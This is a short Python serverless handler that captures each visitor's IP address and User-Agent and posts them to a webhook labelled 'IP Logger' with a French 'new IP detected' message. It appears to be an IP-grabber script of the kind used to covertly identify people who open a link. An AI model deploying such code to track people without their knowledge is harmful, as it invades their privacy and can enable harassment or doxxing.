import json
import requests

WEBHOOK_URL = "WEBHOOK_URL"

def handler(event, context):
    try:
        headers = event.get('headers', {})
        client_ip = headers.get('x-forwarded-for', 'IP not found')
        user_agent = headers.get('user-agent', 'User-Agent not found')

        requests.post(WEBHOOK_URL, json={
            "username": "IP Logger",
            "content": f"**Nouvelle IP détectée !**\n- **IP:** {client_ip}\n- **User-Agent:** {user_agent}"
        })

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({"message": "IP logged successfully."})
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({"error": str(e)})
        }
